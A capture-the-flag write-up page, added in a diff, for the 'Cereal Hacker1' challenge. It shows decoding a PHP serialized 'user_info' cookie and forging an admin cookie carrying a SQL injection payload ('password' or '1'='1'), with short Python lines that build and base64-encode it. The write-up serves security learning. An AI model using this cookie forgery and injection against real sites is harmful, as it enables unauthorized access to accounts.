@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Cereal Hacker1</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Cereal Hacker1</h1>
+</header>
+<p>Tried to login as <code>guest:guest</code>, it redirect to <code>/index.php?file=regular_user</code>. checkout application cookies, the value of <code>user_info</code> looks suspicious. it is a url-encoded base64 string.</p>
+<p>After decoding, we got a object description</p>
+<pre><code>O:11:&quot;permissions&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:8:&quot;password&quot;;s:5:&quot;guest&quot;;}</code></pre>
+<p><code>O</code> =&gt; Object <code>s</code> =&gt; string attribute</p>
+<p>Number indicates the length of the following value.</p>
+<p>If we change <code>guest</code> to <code>admin</code>, then we can visit as admin. we need SQL injection to bypass the password.</p>
+<pre><code>pw = &quot;password&#39; or &#39;1&#39;=&#39;1&quot;
+user_info = &#39;O:11:&quot;permissions&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:&#39;+str(len(pw))+&#39;:&quot;&#39;+pw+&#39;&quot;;}&#39;
+cookie = base64.b64encode(s.encode())</code></pre>
+<p>Replace the value of <code>user_info</code> with the updated one, try to visit admin page <code>/index.php?file=admin</code>, now we have the flag.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
